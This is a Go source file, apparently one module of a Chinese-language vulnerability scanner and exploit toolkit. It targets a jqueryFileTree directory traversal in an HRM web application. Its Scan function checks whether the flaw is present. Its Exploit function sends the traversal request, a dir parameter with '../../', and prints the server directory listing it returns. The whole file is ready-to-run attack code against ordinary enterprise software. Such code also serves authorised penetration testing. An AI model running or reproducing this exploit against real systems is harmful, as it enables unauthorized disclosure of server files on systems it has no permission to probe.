package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wc10 struct {
}

func (s *Wc10) Scan(targetUrl string) {
	vulnerable, err := Wc10scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc10] 存在jqueryFileTree 目录遍历")
	} else {
		color.White("[Wc10] 不存在jqueryFileTree目录遍历")
	}
}

func (*Wc10) Exploit(targetUrl string) {
	runResult, err := Wc10runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc10scancore(targetUrl string) (bool, error) {
	url := "/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "[") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc10runcore(targetUrl string) (string, error) {
	url := "/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "[") {
		return "存在jqueryFileTree 目录遍历\n" + resContent, nil
	} else {
		return "", nil
	}
}
